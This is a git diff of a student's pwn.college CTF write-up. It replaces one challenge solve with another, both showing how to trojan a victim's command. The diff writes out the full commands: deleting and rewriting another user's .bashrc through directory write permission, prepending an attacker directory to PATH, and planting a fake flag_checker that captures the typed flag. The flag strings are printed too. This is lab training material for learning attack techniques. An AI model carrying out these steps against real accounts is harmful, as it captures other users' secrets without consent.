@@ -33,27 +33,32 @@ zardus@dojo:~$ chmod a+w /home/zardus
 As you know, there are lots of sensitive files in that directory such as .bashrc! Can you replicate the previous attack with write access to /home/zardus instead of /home/zardus/.bashrc?
 
 ### Solve
-**Flag:** `pwn.college{w2WF8dlH8qhVuVgR58SyKeUvWF0.0VMzEzNxwiNyUDN0EzW}`
+**Flag:** `pwn.college{0h9F6SazsfeTSAuGRB3FWhFfB18.0FM0EzNxwiNyUDN0EzW}`
 
-This challenge combined two concepts from earlier modules: modifying a user's .bashrc file and hijacking commands through PATH. Instead of stealing a file, the goal was to intercept a secret that Zardus manually entered into the flag_checker program. A fake flag_checker script was created that displayed the expected prompt (Type the flag) and then echoed whatever input it received. The victim's .bashrc was modified to place the directory containing the fake program at the front of PATH. When Zardus logged in and executed flag_checker, the shell found and launched the malicious version instead of the real one, causing the flag to be printed back to the screen.
+This challenge built on the previous .bashrc attack but introduced a more realistic vulnerability. Instead of having write access directly to /home/zardus/.bashrc, the challenge granted write access to the entire /home/zardus directory. Because write permission on a directory allows files inside it to be deleted and recreated, the original .bashrc was removed and replaced with a malicious version. A fake flag_checker program was then created and placed in a directory controlled by the attacker. The replacement .bashrc modified PATH so that the attacker's version of flag_checker was found before the legitimate one. When Zardus logged in and executed flag_checker, the fake program captured and displayed the flag that he manually entered.
 
 ```bash
-hacker@shenanigans~sniffing-input:~$ mkdir ~/evil
-hacker@shenanigans~sniffing-input:~$ nano ~/evil/flag_checker
+hacker@shenanigans~overshared-directories:~$ ls -la /home/zardus/.bashrc
+-rw-r--r-- 1 zardus zardus 148 Jun 15 16:02 /home/zardus/.bashrc
+hacker@shenanigans~overshared-directories:~$ rm /home/zardus/.bashrc
+rm: remove write-protected regular file '/home/zardus/.bashrc'? y
+hacker@shenanigans~overshared-directories:~$ mkdir ~/evil
+hacker@shenanigans~overshared-directories:~$ nano ~/evil/flag_checker
 (#!?bin/bash
 echo "Type the flag"
 cat)
-hacker@shenanigans~sniffing-input:~$ chmod +x ~/evil/flag_checker
-hacker@shenanigans~sniffing-input:~$ echo 'PATH=/home/hacker/evil:$PATH' >> /home/zardus/.bashrc
-hacker@shenanigans~sniffing-input:~$ /challenge/victim
+hacker@shenanigans~overshared-directories:~$ chmod +x ~/evil/flag_checker
+hacker@shenanigans~overshared-directories:~$ rm /home/zardus/.bashrc
+hacker@shenanigans~overshared-directories:~$ echo 'PATH=/home/hacker/evil:$PATH' > /home/zardus/.bashrc
+hacker@shenanigans~overshared-directories:~$ /challenge/victim
 Username: zardus
-zardus@shenanigans~sniffing-input:~$ ***********
--bash: 1498726685: command not found
-zardus@shenanigans~sniffing-input:~$ flag_checker
+zardus@shenanigans~overshared-directories:~$ ***********
+-bash: 2323011838: command not found
+zardus@shenanigans~overshared-directories:~$ flag_checker
 
 Type the flag
-*************************************************************pwn.college{4KJrUijph2pPaiqOSQNdt0S-otI.0VNzEzNxwiNyUDN0EzW}
+*************************************************************pwn.college{0h9F6SazsfeTSAuGRB3FWhFfB18.0FM0EzNxwiNyUDN0EzW}
 ```
 
 ### New Learnings
-Learned how command hijacking can be used to intercept sensitive user input rather than simply execute malicious commands. Reinforced the importance of the PATH variable in determining which executable is launched when a command name is entered. Also gained experience combining startup-script persistence (.bashrc) with PATH manipulation to replace a legitimate program with a malicious lookalike, demonstrating a classic technique used by attackers to capture credentials, secrets, and other user-provided data.
+Learned that write permission on a directory is often more dangerous than write permission on an individual file. Even without permission to modify a file directly, a user who can write to the containing directory can delete the original file and replace it with a malicious version. This challenge demonstrated how insecure directory permissions can enable privilege abuse, persistence, and command hijacking attacks. It also reinforced how PATH manipulation can redirect users to attacker-controlled executables without requiring modifications to the target program itself.
